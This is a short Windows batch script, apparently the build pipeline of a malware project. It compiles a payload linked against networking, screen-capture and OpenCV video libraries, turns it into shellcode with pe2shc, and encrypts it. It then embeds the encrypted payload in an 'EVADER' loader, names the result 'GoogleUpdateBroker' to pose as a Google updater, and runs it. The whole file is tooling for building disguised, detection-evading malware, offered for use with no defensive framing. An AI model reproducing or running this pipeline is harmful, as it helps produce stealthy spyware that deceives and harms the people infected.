@echo off

echo compiling: _payload.cpp
g++ _payload.cpp -Llib -lgdiplus -lgdi32 -lole32 -lwsock32 -lWs2_32 -luuid -lrpcrt4 -llibopencv_core455 -llibopencv_videoio455 -llibopencv_imgcodecs455 -o _payload
if %errorlevel% neq 0 (
    echo compilation failed.
    exit
)

echo pe to shellcode
pe2shc _payload.exe _payload.shc

echo compiling and running: ENCRYPT.cpp
g++ ENCRYPT.cpp -o ENCRYPT
ENCRYPT.exe _payload.shc

echo compiling: payload_rss.rc
windres payload_rss.rc -o payload_rss.o

echo compiling: EVADER.cpp
g++ EVADER.cpp payload_rss.o -O3 -Os -o GoogleUpdateBroker

if %errorlevel% equ 0 (
    echo compilation successful. running GoogleUpdateBroker.exe.
    GoogleUpdateBroker.exe
) else (
    echo compilation failed.
)